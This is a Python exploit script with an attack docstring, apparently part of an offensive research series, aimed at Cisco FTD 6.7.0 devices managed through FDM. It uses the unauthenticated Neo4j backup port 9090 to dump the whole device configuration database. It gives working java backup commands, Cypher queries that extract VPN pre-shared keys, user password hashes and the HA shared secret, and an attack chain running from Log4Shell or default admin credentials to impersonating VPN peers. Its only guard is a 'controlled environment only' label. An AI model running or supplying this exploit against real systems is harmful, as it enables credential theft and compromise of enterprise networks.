"""
F-FTD-96: Neo4j 3.4.16 unauthenticated backup → full FTD policy DB extraction
CONTROLLED ENVIRONMENT ONLY

Root cause:
  repositories.jar: com/cisco/ngfw/onbox/backend/repositories/neo4jConfig.properties:
    dbms.backup.enabled=true
    dbms.backup.address=127.0.0.1:9090

  neo4j-impl.jar: META-INF/neo4j-application-production.properties:
    db.driver=embedded
    dbms.backup.enabled=true
    dbms.backup.address=127.0.0.1:9090

  Neo4j 3.4.16 runs as an embedded server in the FDM Tomcat JVM.
  The backup service listens on localhost:9090.
  Neo4j backup protocol (3.x) has NO authentication — it is designed for
  local/trusted network use. Any process that can reach 9090 can pull the
  full graph database without credentials.

WHAT THE DATABASE CONTAINS:
  FDM stores ALL on-box configuration in Neo4j:
  - Access policies and security rules (complete firewall ruleset)
  - Network interface configuration
  - NAT rules (source/destination NAT for all traffic flows)
  - VPN configuration (site-to-site and AnyConnect remote access)
    → includes pre-shared keys (PSK) for IKEv1/IKEv2
    → includes AnyConnect client profiles and connection profiles
  - Certificate bindings and SSL policy configuration
  - User accounts and password hashes
  - LDAP/RADIUS AAA configuration (duplicates F-FTD-89 findings)
  - Intrusion policy bindings
  - File/AMP policy configuration
  - High Availability (HA) configuration
    → HA shared secret (used for standby sync)
  - Smart License registration tokens
  - Management access settings (ACLs for who can access FDM)
  - DNS, NTP, DHCP server configuration

ATTACK:
  From www shell (post F-FTD-78, F-FTD-67, or F-FTD-95):

  Option 1: neo4j-backup tool (available in WEB-INF/lib or system path)
    # Pull full database backup to /tmp/fdm-neo4j-backup/
    java -cp /usr/local/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/neo4j-backup-3.4.16.jar:\
    /usr/local/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/neo4j-3.4.16.jar:\
    /usr/local/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/neo4j-causal-clustering-3.4.16.jar \
    org.neo4j.backup.OnlineBackupCommandProvider \
    --host=127.0.0.1 --port=9090 --backup-dir=/tmp/fdm-backup/ --name=fdm

  Option 2: Direct Bolt protocol query (port 7687 if bolt enabled)
    # Check if bolt port is open:
    nc -z 127.0.0.1 7687 && echo "bolt open"
    # If open: cypher-shell or direct bolt queries

  Option 3: Read database files directly (root required, or via F-FTD-86)
    find /ngfw -name "neostore*" -o -name "*.db" 2>/dev/null
    # Typical path: /ngfw/var/cisco/ngfwdb/ or /var/lib/neo4j/
    # With root (F-FTD-85): copy raw Neo4j store files

  Option 4: Use neo4j-admin from command line if accessible
    neo4j-admin dump --database=graph.db --to=/tmp/fdm.dump

CYPHER EXTRACTION (if bolt available):
  MATCH (n) RETURN n LIMIT 1000   -- enumerate all nodes
  MATCH (u:User) RETURN u          -- extract all user accounts
  MATCH (a:AccessRule) RETURN a    -- extract complete firewall ruleset
  MATCH (v:VpnConfig) RETURN v     -- extract VPN PSKs
  MATCH (c:Certificate) RETURN c   -- extract certificate associations

HIGH-VALUE TARGETS IN DB:
  1. VPN PSKs — IKEv1/IKEv2 pre-shared keys for all site-to-site tunnels
     → Active S2S VPN impersonation / MITM for all connected peers
  2. HA shared secret — used in sftunnel authentication
     → Combined with F-FTD-49/F-FTD-60: compromise standby device
  3. AnyConnect profile data — client connection profiles, split tunneling config
     → Craft rogue AnyConnect server with exact replica of enterprise profile
  4. Complete firewall policy — full security posture map
     → Identify policy gaps (what traffic is allowed), plan lateral movement
  5. Management ACLs — which hosts can reach FDM management
     → Refine attack scope (which management hosts to target next)

CHAIN:
  F-FTD-95 (Log4Shell pre-auth RCE) → www shell
  OR F-FTD-79 (admin:Admin123) → F-FTD-67 (zip-slip) → www shell
  → reach 127.0.0.1:9090 (www process, no root needed)
  → pull complete Neo4j backup → extract VPN PSKs, complete policy
  → VPN PSKs → impersonate all S2S VPN peers

  From root (F-FTD-85):
  → Read raw Neo4j store files → offline DB analysis
  → Or: restart Neo4j with auth disabled to get bolt access

VERIFY (controlled environment):
  # Confirm port 9090 is listening:
  ss -tlnp 2>/dev/null | grep 9090
  netstat -tlnp 2>/dev/null | grep 9090
  nc -z 127.0.0.1 9090 && echo "backup port OPEN"

  # Attempt connection (ncat/curl raw TCP):
  # Neo4j 3.x backup uses custom binary protocol on 9090
  # The neo4j-backup tool is the canonical way to interact with it

  # Check if bolt (7687) is also open:
  nc -z 127.0.0.1 7687 && echo "bolt OPEN"

Affected: FTD 6.7.0-65 with FDM (repositories.jar + neo4j-impl.jar production config confirmed)
Severity: HIGH — complete FTD policy database exfiltration from www shell;
          VPN PSKs, HA secrets, user accounts, firewall ruleset all in graph DB;
          no authentication required on backup port 9090
Auth required: www shell (post F-FTD-67, F-FTD-78, F-FTD-95, or equivalent)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import subprocess
import socket
import json
import os


NEO4J_BACKUP_HOST = "127.0.0.1"
NEO4J_BACKUP_PORT = 9090
NEO4J_BOLT_PORT = 7687

# Neo4j JARs in FDM deployment
FDM_LIB = "/usr/local/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib"
NEO4J_BACKUP_JAR = f"{FDM_LIB}/neo4j-backup-3.4.16.jar"
NEO4J_JAR = f"{FDM_LIB}/neo4j-3.4.16.jar"


def check_ports():
    """Check if Neo4j backup and bolt ports are listening. CONTROLLED ENVIRONMENT ONLY."""
    print(f"[*] F-FTD-96: Checking Neo4j ports")
    for port, name in [(NEO4J_BACKUP_PORT, "backup"), (NEO4J_BOLT_PORT, "bolt")]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            rc = s.connect_ex((NEO4J_BACKUP_HOST, port))
            s.close()
            status = "OPEN" if rc == 0 else "closed"
            print(f"    127.0.0.1:{port} ({name}): {status}")
            if rc == 0 and port == NEO4J_BACKUP_PORT:
                print(f"[!!!] Neo4j backup port OPEN — dbms.backup.enabled=true confirmed live")
        except Exception as e:
            print(f"    127.0.0.1:{port} ({name}): error — {e}")


def pull_backup(output_dir="/tmp/fdm-neo4j-backup"):
    """
    Pull Neo4j database backup using neo4j-backup tool.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-96: Pulling Neo4j backup to {output_dir}")
    os.makedirs(output_dir, exist_ok=True)

    # Build classpath — need neo4j-backup and core JARs
    jars = [
        f"{FDM_LIB}/neo4j-backup-3.4.16.jar",
        f"{FDM_LIB}/neo4j-3.4.16.jar",
        f"{FDM_LIB}/neo4j-causal-clustering-3.4.16.jar",
        f"{FDM_LIB}/neo4j-cluster-3.4.16.jar",
        f"{FDM_LIB}/neo4j-com-3.4.16.jar",
        f"{FDM_LIB}/neo4j-kernel-3.4.16.jar",
        f"{FDM_LIB}/neo4j-io-3.4.16.jar",
        f"{FDM_LIB}/neo4j-logging-3.4.16.jar",
        f"{FDM_LIB}/neo4j-collections-3.4.16.jar",
    ]

    classpath = ":".join(jars)

    cmd = [
        "java", "-cp", classpath,
        "org.neo4j.commandline.admin.AdminTool",
        "backup",
        f"--from={NEO4J_BACKUP_HOST}:{NEO4J_BACKUP_PORT}",
        f"--backup-dir={output_dir}",
        "--name=fdm",
        "--check-consistency=false",  # Skip consistency check, faster extraction
    ]

    print(f"    Command: {' '.join(cmd)}")
    print(f"    Pulling backup from {NEO4J_BACKUP_HOST}:{NEO4J_BACKUP_PORT}...")

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    if result.stdout:
        print(f"    STDOUT: {result.stdout[:500]}")
    if result.stderr:
        print(f"    STDERR: {result.stderr[:300]}")

    backup_dir = os.path.join(output_dir, "fdm")
    if os.path.exists(backup_dir):
        size = sum(os.path.getsize(os.path.join(dirpath, f))
                   for dirpath, _, files in os.walk(backup_dir) for f in files)
        print(f"[!!!] Backup pulled: {backup_dir} ({size/1024/1024:.1f} MB)")
        return backup_dir
    else:
        print(f"[-] Backup directory not created — check error output")
        return None


def find_neo4j_db_path():
    """Locate Neo4j database files on the filesystem. CONTROLLED ENVIRONMENT ONLY."""
    print(f"[*] F-FTD-96: Searching for Neo4j database files")
    search_paths = [
        "/ngfw/var/cisco/ngfwdb",
        "/ngfw/var/cisco/ngfw",
        "/var/lib/neo4j",
        "/usr/local/cisco/ngfwWebUi/db",
        "/ngfw/var",
    ]

    for base in search_paths:
        cmd = ["find", base, "-name", "neostore*", "-o",
               "-name", "graph.db", "-o", "-name", "store_lock"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if result.stdout.strip():
            print(f"[!!!] Neo4j store files found under {base}:")
            for line in result.stdout.strip().split('\n'):
                print(f"    {line}")
            return base
    print(f"[-] Neo4j store files not found in expected paths")
    return None


def bolt_cypher_query(query, host="127.0.0.1", port=NEO4J_BOLT_PORT):
    """
    Execute Cypher query via Bolt protocol (if bolt port open).
    Requires cypher-shell in PATH or neo4j-cypher-shell jar.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-96: Executing Cypher via bolt: {query[:80]}")
    # Try cypher-shell first
    cmd = [
        "cypher-shell",
        f"--address=bolt://{host}:{port}",
        "--format=json",
        query
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            print(f"[!!!] Cypher result: {result.stdout[:500]}")
            return result.stdout
        else:
            print(f"[-] cypher-shell error: {result.stderr[:200]}")
    except FileNotFoundError:
        print(f"[-] cypher-shell not in PATH — use java client or BOLT wire protocol")
    return None


def extract_vpn_psks():
    """
    Extract VPN pre-shared keys from Neo4j database (requires bolt access or file access).
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-96: Extracting VPN PSKs from Neo4j")
    psk_queries = [
        "MATCH (n) WHERE n.presharedKey IS NOT NULL RETURN n.presharedKey, labels(n)",
        "MATCH (n) WHERE n.psk IS NOT NULL RETURN n.psk, labels(n)",
        "MATCH (n:IkevOnePolicy) RETURN n",
        "MATCH (n:IkevTwoPolicy) RETURN n",
        "MATCH (n:S2SConnectionProfile) RETURN n.name, n.presharedKey",
    ]
    for query in psk_queries:
        bolt_cypher_query(query)


def print_attack_summary():
    print("""
F-FTD-96: Neo4j 3.4.16 Unauthenticated Backup → Full FTD Policy DB Exfil
==========================================================================

Source:
  repositories.jar: neo4jConfig.properties
    dbms.backup.enabled=true
    dbms.backup.address=127.0.0.1:9090

  neo4j-impl.jar: neo4j-application-production.properties
    db.driver=embedded
    dbms.backup.enabled=true
    dbms.backup.address=127.0.0.1:9090

ATTACK:
  From www shell → reach 127.0.0.1:9090 (localhost, no auth)
  java -cp neo4j-backup-3.4.16.jar:[...] org.neo4j.commandline.admin.AdminTool backup
    --from=127.0.0.1:9090 --backup-dir=/tmp/fdm-backup/ --name=fdm

  Pulls complete Neo4j graph database:
    - VPN PSKs for all S2S tunnels → impersonate all VPN peers
    - HA shared secret → attack standby device
    - Complete firewall ruleset → map security posture
    - User accounts and hashes → credential reuse
    - LDAP/RADIUS AAA config → AD credential leak (amplifies F-FTD-89)
    - Management ACLs → enumerate admin hosts for lateral movement
    - Smart License tokens → revoke licensing (DoS)
    - AnyConnect profiles → craft rogue VPN server

SEVERITY AMPLIFICATION:
  VPN PSKs are the highest-value finding — any S2S VPN connected to
  this FTD exposes its pre-shared key. Attacker can impersonate ANY
  connected VPN peer, inject traffic into encrypted tunnels.

  Combined with FMC access (F-FTD-76 CA swap or FMC compromise):
  Complete network security posture becomes attacker property.
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-96: Neo4j 3.4.16 unauthenticated backup → policy DB exfil")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print_attack_summary()

    elif mode == "check":
        check_ports()

    elif mode == "backup":
        output_dir = sys.argv[2] if len(sys.argv) > 2 else "/tmp/fdm-neo4j-backup"
        check_ports()
        pull_backup(output_dir)

    elif mode == "find":
        find_neo4j_db_path()

    elif mode == "psks":
        extract_vpn_psks()

    elif mode == "cypher":
        if len(sys.argv) < 3:
            print(f"Usage: {sys.argv[0]} cypher '<CYPHER QUERY>'")
            sys.exit(1)
        bolt_cypher_query(sys.argv[2])

    elif mode == "full":
        check_ports()
        db = pull_backup()
        if not db:
            db = find_neo4j_db_path()
        extract_vpn_psks()

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
